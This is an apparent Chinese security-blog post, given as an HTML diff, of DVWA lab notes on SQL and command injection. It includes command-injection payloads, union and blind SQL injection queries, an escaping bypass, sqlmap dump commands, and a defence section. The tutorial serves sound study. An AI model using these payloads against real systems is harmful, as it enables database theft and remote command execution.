@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="zh-CN" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Web 注入攻击：SQL 注入与命令注入 · pressure-J</title>
+<meta name="description" content="一句话原理：程序把用户输入直接拼进了可执行语句（SQL 语句 / shell 命令），输入里的特殊字符改变了语句原本的逻辑，实现了&quot;输入即代码&quot;。">
+<meta name="author" content="pressure-J">
+<meta name="color-scheme" content="dark light">
+<link rel="canonical" href="https://pressure-j.github.io/posts/web-zhu-ru-gong-ji-sql-zhu-ru-yu-ming-ling-zhu-ru.html">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Web 注入攻击：SQL 注入与命令注入 · pressure-J">
+<meta property="og:description" content="一句话原理：程序把用户输入直接拼进了可执行语句（SQL 语句 / shell 命令），输入里的特殊字符改变了语句原本的逻辑，实现了&quot;输入即代码&quot;。">
+<meta property="og:site_name" content="pressure-J">
+<meta name="twitter:card" content="summary">
+<link rel="alternate" type="application/rss+xml" title="pressure-J" href="../rss.xml">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🛡</text></svg>">
+<link rel="stylesheet" href="../assets/style.css">
+<link rel="stylesheet" href="../assets/highlight.css">
+<script>
+(function() {
+  try {
+    var t = localStorage.getItem('theme');
+    if (!t) t = window.matchMedia('(prefers-color-scheme: light)').matches ? 'light' : 'dark';
+    document.documentElement.setAttribute('data-theme', t);
+  } catch (e) {}
+})();
+</script>
+</head>
+<body class="has-toc">
+<div class="progress-bar" id="progress"></div>
+<header class="site-header">
+  <div class="wrap header-inner">
+    <a class="brand" href="../index.html">
+      <span class="brand-mark">$</span><span class="brand-name">pressure-J</span><span class="brand-caret">_</span>
+    </a>
+    <nav class="site-nav" id="site-nav"><a href="../index.html">首页</a><a href="../posts.html" class="on">文章</a><a href="../category/index.html">分类</a><a href="../about.html">关于</a></nav>
+    <div class="header-tools">
+      <a class="icon-btn" href="../posts.html#search" aria-label="搜索">
+        <svg viewBox="0 0 24 24" width="17" height="17" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.6-3.6"/></svg>
+      </a>
+      <button class="icon-btn" id="theme-toggle" type="button" aria-label="切换主题">
+        <svg class="i-sun" viewBox="0 0 24 24" width="17" height="17" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="12" cy="12" r="4.4"/><path d="M12 2.2v2.2M12 19.6v2.2M2.2 12h2.2M19.6 12h2.2M4.9 4.9l1.6 1.6M17.5 17.5l1.6 1.6M19.1 4.9l-1.6 1.6M6.5 17.5l-1.6 1.6"/></svg>
+        <svg class="i-moon" viewBox="0 0 24 24" width="17" height="17" fill="none" stroke="currentColor" stroke-width="2" stroke-linejoin="round"><path d="M21 12.9A8.6 8.6 0 1 1 11.1 3a6.6 6.6 0 0 0 9.9 9.9z"/></svg>
+      </button>
+      <button class="icon-btn menu-btn" id="menu-btn" type="button" aria-label="菜单" aria-expanded="false">
+        <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M3 6h18M3 12h18M3 18h18"/></svg>
+      </button>
+    </div>
+  </div>
+</header>
+<main class="wrap post-layout">
+  <div class="post-main">
+    <nav class="breadcrumb">
+      <a href="../index.html">首页</a><span>/</span>
+      <a href="../category/web.html">Web 安全</a>
+    </nav>
+    <article class="post">
+      <header class="post-header">
+        <h1>Web 注入攻击：SQL 注入与命令注入</h1>
+        <div class="post-meta">
+          <span class="cat-badge cat-web">Web 安全</span>
+          <time datetime="2026-08-28">2026-08-28</time>
+          <span>4009 字</span>
+          <span>约 11 分钟</span>
+        </div>
+        
+      </header>
+      <div class="content"><blockquote>
+<p>来源：Web 工程与安全课程实验（DVWA 平台，2025-2026 第二学期）<br />
+定位：渗透测试核心中的核心，OWASP Top 1 漏洞，面试必问<br />
+实战场景：任何带数据库的 Web 应用（登录框、搜索框、参数传递处）</p>
+</blockquote>
+<hr />
+<h2 id="_1">一、注入攻击是什么</h2>
+<p><strong>一句话原理</strong>：程序把用户输入<strong>直接拼进</strong>了可执行语句（SQL 语句 / shell 命令），输入里的特殊字符改变了语句原本的逻辑，实现了"输入即代码"。</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>命令注入: system("ping " + 用户输入)   →  输入 ;ifconfig  →  执行了额外命令
+SQL注入:  SELECT * FROM users WHERE id='用户输入'  →  输入 ' or 1=1#  →  查询逻辑被改写
+</code></pre></div></div>
+
+<p><strong>为什么危险</strong>：注入能造成 信息泄露（脱库）、权限绕过（万能密码）、远程命令执行（RCE）、甚至提权拿到服务器。</p>
+<hr />
+<h2 id="command-injection">二、命令注入（Command Injection）</h2>
+<h3 id="_2">原理</h3>
+<p>Web 后端调用系统命令（如 ping、nslookup）时，未过滤就拼接用户输入。</p>
+<h3 id="dvwa">核心绕过手法（DVWA 三级别，思路递进）</h3>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>级别</th>
+<th>过滤规则</th>
+<th>绕过手法</th>
+<th>示例 Payload</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Low</td>
+<td>无过滤</td>
+<td>shell 元字符直接拼接</td>
+<td><code>127.0.0.1;ifconfig</code>（分号连续执行）</td>
+</tr>
+<tr>
+<td>Medium</td>
+<td>过滤 <code>&amp;&amp;</code> 和 <code>;</code></td>
+<td>用<strong>没被过滤</strong>的 <code>&amp;</code> 代替</td>
+<td><code>127.0.0.1&amp;ls -l</code>（后台执行）</td>
+</tr>
+<tr>
+<td>High</td>
+<td>黑名单过滤大量符号，但<strong>管道符 <code>|</code> 后面误加了空格</strong>（<code>|</code>）</td>
+<td>利用过滤规则的疏漏，用 <code>|</code>（管道）</td>
+<td><code>127.0.0.1|ls</code></td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>命令拼接常用符号速记</strong>：<br />
+- <code>;</code> 顺序执行 ／ <code>&amp;&amp;</code> 前面成功才执行 ／ <code>|</code> 管道传给下一条 ／ <code>||</code> 前面失败才执行 ／ <code>`cmd`</code> 与 <code>$(cmd)</code> 命令替换 ／ <code>&amp;</code> 后台执行</p>
+<h3 id="_3">审计要点（防御侧视角）</h3>
+<ul>
+<li>代码层：<strong>永远不要</strong>用 <code>system()</code> / <code>exec()</code> / <code>shell_exec()</code> 拼接用户输入；用白名单校验参数（如 IP 格式正则）</li>
+<li>现实漏洞案例：路由器/摄像头 Web 管理页的 ping 测试、导出功能里拼系统命令</li>
+</ul>
+<hr />
+<h2 id="sql">三、SQL 注入</h2>
+<h3 id="_4">类型判断（第一件事永远是这个）</h3>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>输入 1         → 正常回显
+输入 1'        → 报错 / 异常          （可能字符型注入）
+输入 1 or 1=1  → 若返回全部数据 → 数字型；若只返回 id=1 的行 → 字符型
+</code></pre></div></div>
+
+<ul>
+<li>数字型：<code>WHERE id = 1 or 1=1</code> → 永真，返回所有</li>
+<li>字符型：<code>WHERE id = '1 or 1=1'</code> → 等价于 <code>id='1'</code>，只返回一条</li>
+</ul>
+<h3 id="union">手工注入八步法（union 注入，重点背）</h3>
+<ol>
+<li><strong>判断注入点</strong>：<code>1'</code> 报错，说明语句被破坏</li>
+<li><strong>判断类型</strong>：字符型 / 数字型（如上）</li>
+<li><strong>猜字段数</strong>：<code>1' order by N#</code>（N 递增，报错的那格就是列数上限）→ union 前后字段数必须一致</li>
+<li><strong>猜数据库名</strong>：<code>1' union select 1,database()#</code></li>
+<li><strong>猜表名</strong>：<code>1' union select 1,group_concat(table_name) from information_schema.tables where table_schema='dvwa'#</code></li>
+<li><strong>猜字段名</strong>：<code>1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users'#</code></li>
+<li><strong>拖数据</strong>：<code>1' union select user,password from users#</code></li>
+<li><strong>解密码</strong>：MD5 等哈希 → 彩虹表 / cmd5 / 在线破解</li>
+</ol>
+<h3 id="_5">关键知识点（面试常问，逐个搞懂）</h3>
+<ul>
+<li><strong><code>#</code>（MySQL 注释）</strong>：截断后面的 <code>'</code> 和查询尾巴，让拼接语句合法</li>
+<li><strong><code>union</code> 要求前后 SELECT 字段数一致</strong> → 所以才要先 <code>order by</code> 猜列数</li>
+<li><strong><code>information_schema</code></strong>：MySQL 自带"元数据库"，<code>TABLES</code> 存所有表名、<code>COLUMNS</code> 存所有字段名 —— 脱库的地图</li>
+<li><strong><code>group_concat()</code></strong>：把多行结果拼成一行显示，解决"一个位置只能回显一个字段"的问题</li>
+<li><strong>回显位</strong>：union 里 <code>select 1,database()#</code> 的 <code>1</code> 是占位（填充不回显的列），<code>database()</code> 放在<strong>有回显的那一列</strong></li>
+<li><strong>SQL 注入 → GetShell 进阶</strong>：<code>into outfile</code> 写一句话木马、<code>load_file()</code> 读文件、堆叠注入</li>
+</ul>
+<h3 id="medium">Medium 绕过（转义函数）</h3>
+<ul>
+<li><code>mysqli_real_escape_string()</code> 会把 <code>'</code> 转义成 <code>\'</code>，单引号字符串失效</li>
+<li><strong>绕过：把字符串转十六进制，不带引号</strong>：<code>'dvwa'</code> → <code>0x64767761</code>（dvwa 的 hex）</li>
+<li>通用思路：<strong>一切过滤都是"这个符号被处理了，那就用不含这个符号的写法表达同样的意思"</strong></li>
+</ul>
+<h3 id="high">High 绕过（双页面架构）</h3>
+<ul>
+<li>输入页与回显页分离（session 传值），注入点报错后主页面会一直卡在错误状态 → <strong>删 Cookie / 清 session 重来</strong></li>
+<li>本质还是字符型注入，八步法照走：<code>2' or 1=1 order by 1#</code></li>
+</ul>
+<h3 id="blind-sql-injection">盲注（Blind SQL Injection）</h3>
+<p><strong>场景</strong>：页面不回显数据，只有"存在/不存在"两种反馈（<code>User ID exists in the database.</code>）</p>
+<p><strong>手工盲注方法论（length → substr → ascii 二分猜）</strong>：<br />
+1. <strong>猜库名长度</strong>：<code>1' and length(database())=N#</code>（N 从 1 递增，返回"存在"即命中）<br />
+2. <strong>猜每一位字符</strong>：<code>1' and ascii(substr(database(),1,1))&gt;N#</code>（不断二分逼近，看 ASCII 表还原字符）<br />
+3. 表名/字段名/数据 同理，叠加子查询 + limit：<br />
+   - 表数量：<code>1' and (select count(table_name) from information_schema.tables where table_schema='dvwa')=2#</code><br />
+   - 第 N 张表长度：<code>1' and length(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1),1))=9#</code><br />
+   - 第 N 张表第 M 个字符：<code>1' and ascii(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1),1,1))&gt;100#</code></p>
+<blockquote>
+<p>盲注核心思想：<strong>把"数据库内容"变成"一个个布尔判断题"</strong>，一次问一个字符，自动化脚本就是干这个的。</p>
+</blockquote>
+<hr />
+<h2 id="sqlmap">四、sqlmap 自动化（面试/实战必会）</h2>
+<h3 id="_6">基础命令模板</h3>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code><span class="c1"># GET 注入，枚举库</span>
+python<span class="w"> </span>sqlmap.py<span class="w"> </span>-u<span class="w"> </span><span class="s2">"http://target/vuln.php?id=1"</span><span class="w"> </span>--cookie<span class="w"> </span><span class="s2">"PHPSESSID=xxx; security=low"</span><span class="w"> </span>--dbs<span class="w"> </span>--batch
+
+<span class="c1"># 指定库 → 表 → 字段 → 数据（一条龙）</span>
+python<span class="w"> </span>sqlmap.py<span class="w"> </span>-u<span class="w"> </span><span class="s2">"http://target/vuln.php?id=1"</span><span class="w"> </span>--cookie<span class="w"> </span><span class="s2">"PHPSESSID=xxx"</span><span class="w"> </span>-D<span class="w"> </span>dvwa<span class="w"> </span>-T<span class="w"> </span>users<span class="w"> </span>--dump<span class="w"> </span>--batch
+</code></pre></div></div>
+
+<h3 id="_7">按场景选参数</h3>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>场景</th>
+<th>参数</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>POST 注入（参数在请求体）</td>
+<td><code>--data "id=1&amp;Submit=Submit" --method POST</code></td>
+</tr>
+<tr>
+<td>需要登录态</td>
+<td><code>--cookie "..."</code></td>
+</tr>
+<tr>
+<td>双页面（输入页≠回显页）</td>
+<td><code>--second-url "http://target/回显页"</code></td>
+</tr>
+<tr>
+<td>过滤转义函数</td>
+<td><code>--tamper</code>（如 <code>space2comment</code> 等绕过脚本）</td>
+</tr>
+<tr>
+<td>指定列</td>
+<td><code>-C user,password</code></td>
+</tr>
+<tr>
+<td>清缓存重试</td>
+<td><code>--flush-session</code></td>
+</tr>
+</tbody>
+</table></div>
+<h3 id="_8">实战要点</h3>
+<ul>
+<li>先 <code>--batch</code> 免得交互卡死，cookie 拿对了再跑</li>
+<li>sqlmap 本质 = 自动化的"手工八步法"+"盲注判断"——<strong>理解手工流程才能读懂 sqlmap 的输出</strong></li>
+</ul>
+<hr />
+<h2 id="_9">五、防御（面试必答，对应原理说）</h2>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>攻击点</th>
+<th>防御</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SQL 拼接</td>
+<td><strong>参数化查询 / 预处理语句</strong>（PDO prepare + bindParam），永远不用字符串拼 SQL</td>
+</tr>
+<tr>
+<td>特殊字符</td>
+<td>输入校验白名单 + 转义（转义只是缓解，不是根治）</td>
+</tr>
+<tr>
+<td>数据库权限</td>
+<td>最小权限原则：Web 账号不连 root，禁 <code>into outfile</code> / <code>load_file</code></td>
+</tr>
+<tr>
+<td>错误信息</td>
+<td>关闭详细的 SQL 报错回显（防报错注入+信息泄露）</td>
+</tr>
+<tr>
+<td>命令注入</td>
+<td>禁用 <code>system()</code> 拼接、白名单校验、<code>escapeshellarg()</code> 兜底</td>
+</tr>
+</tbody>
+</table></div>
+<hr />
+<h2 id="_10">六、面试速答卡</h2>
+<ul>
+<li><strong>什么是 SQL 注入</strong>：用户输入拼进 SQL 语句改变了原执行逻辑</li>
+<li><strong>union 注入条件</strong>：回显位存在 + union 前后列数一致</li>
+<li><strong>怎么判断字符型/数字型</strong>：<code>1 or 1=1</code> 看返回（字符型只回一行）</li>
+<li><strong>order by 干嘛的</strong>：猜列数，配合 union</li>
+<li><strong>盲注三件套</strong>：<code>length()</code> 猜长度、<code>substr()</code> 取位、<code>ascii()</code> 转数值二分</li>
+<li><strong>绕过转义</strong>：十六进制代替字符串引号（<code>0x64767761</code>）</li>
+<li><strong>sqlmap 一条龙</strong>：<code>--dbs</code> → <code>-D 库 --tables</code> → <code>-T 表 --columns</code> → <code>--dump</code></li>
+<li><strong>最有效防御</strong>：参数化查询，输入永远当数据不当代码</li>
+</ul></div>
+      <div class="post-nav"><a class="pn-item prev" href="web-shen-tou-ce-shi-dvwa-yu-burp-suite-yu-bao-li-po-jie.html"><span>← 上一篇</span><strong>Web 渗透测试：DVWA 与 Burp Suite 与暴力破解</strong></a><a class="pn-item next" href="web-an-quan-csrf-yu-dian-ji-jie-chi-ji-csp-rao-guo.html"><span>下一篇 →</span><strong>Web 安全：CSRF 与点击劫持及 CSP 绕过</strong></a></div>
+      <div class="post-end">
+        <a href="../posts.html">← 返回文章列表</a>
+        <a href="https://github.com/pressure-J" target="_blank" rel="noopener">在 GitHub 上找我</a>
+      </div>
+    </article>
+  </div>
+  <aside class="toc" id="toc">
+  <div class="toc-title">目录</div>
+  <nav><a href="#_1" class="toc-lv2">一、注入攻击是什么</a><a href="#command-injection" class="toc-lv2">二、命令注入（Command Injection）</a><a href="#_2" class="toc-lv3">原理</a><a href="#dvwa" class="toc-lv3">核心绕过手法（DVWA 三级别，思路递进）</a><a href="#_3" class="toc-lv3">审计要点（防御侧视角）</a><a href="#sql" class="toc-lv2">三、SQL 注入</a><a href="#_4" class="toc-lv3">类型判断（第一件事永远是这个）</a><a href="#union" class="toc-lv3">手工注入八步法（union 注入，重点背）</a><a href="#_5" class="toc-lv3">关键知识点（面试常问，逐个搞懂）</a><a href="#medium" class="toc-lv3">Medium 绕过（转义函数）</a><a href="#high" class="toc-lv3">High 绕过（双页面架构）</a><a href="#blind-sql-injection" class="toc-lv3">盲注（Blind SQL Injection）</a><a href="#sqlmap" class="toc-lv2">四、sqlmap 自动化（面试/实战必会）</a><a href="#_6" class="toc-lv3">基础命令模板</a><a href="#_7" class="toc-lv3">按场景选参数</a><a href="#_8" class="toc-lv3">实战要点</a><a href="#_9" class="toc-lv2">五、防御（面试必答，对应原理说）</a><a href="#_10" class="toc-lv2">六、面试速答卡</a></nav>
+</aside>
+</main>
+<footer class="site-footer">
+  <div class="wrap footer-inner">
+    <div class="footer-col footer-about">
+      <div class="footer-brand">pressure-J<span class="brand-caret">_</span></div>
+      <p>网络安全 · 应急响应 · 流量分析<br>写能复现、能讲清楚的东西。</p>
+    </div>
+    <div class="footer-col">
+      <div class="footer-title">导航</div>
+      <a href="../index.html">首页</a>
+      <a href="../posts.html">全部文章</a>
+      <a href="../category/index.html">分类</a>
+      <a href="../about.html">关于</a>
+    </div>
+    <div class="footer-col">
+      <div class="footer-title">在别处</div>
+      <a href="https://github.com/pressure-J" target="_blank" rel="noopener">GitHub</a>
+      <a href="mailto:1489955298@qq.com">Email</a>
+      <a href="../rss.xml">RSS</a>
+    </div>
+  </div>
+  <div class="wrap footer-bottom">
+    <span>© 2026 pressure-J</span>
+    <span class="footer-build">Build 2026-10-19 · Python + Markdown</span>
+  </div>
+</footer>
+<button class="to-top" id="to-top" type="button" aria-label="回到顶部">
+  <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M12 19V5M5 12l7-7 7 7"/></svg>
+</button>
+<script src="../assets/app.js" defer></script>
+</body>
+</html>
